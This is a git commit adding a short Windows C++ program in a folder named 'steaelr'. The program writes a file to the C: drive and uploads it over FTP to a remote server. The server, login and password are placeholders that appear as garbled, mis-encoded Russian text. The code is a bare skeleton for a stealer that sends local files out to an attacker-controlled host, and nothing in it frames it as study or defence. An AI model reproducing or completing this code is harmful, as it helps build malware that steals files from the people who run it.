d7e410f9d909d6036cdf4f8a935357f29148980c
Robert-Govard <g0896804254@gmail.com>
2023-07-22 19:15:39 +0300

    Добавьте файлы проекта.

---
+++ steaelr/main.cpp
@@ -0,0 +1,34 @@
+#include <Windows.h>
+#include <WinInet.h>
+#include <fstream>
+
+#pragma comment (lib, "wininet.lib")
+
+using namespace std;
+
+int a;
+
+void createFile()
+{
+    ofstream upload ("C:\\Shit.txt");
+    upload << ("Shit") << endl;
+    upload.close();
+}
+
+void FTP()
+{
+    HINTERNET hInternet;
+    HINTERNET hFtpSession;
+    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    hFtpSession = InternetConnect(hInternet, L"ÑÀÉÒ", INTERNET_DEFAULT_FTP_PORT, L"ËÎÃÈÍ", L"ÏÀÐÎËÜ", INTERNET_SERVICE_FTP, 0, 0);
+    FtpPutFile(hFtpSession, L"C:\\Shit.txt", L"//Shit", FTP_TRANSFER_TYPE_ASCII, 0);
+    InternetCloseHandle(hFtpSession);
+    InternetCloseHandle(hInternet);
+
+}
+
+int main()
+{
+    createFile();
+    FTP();
+}
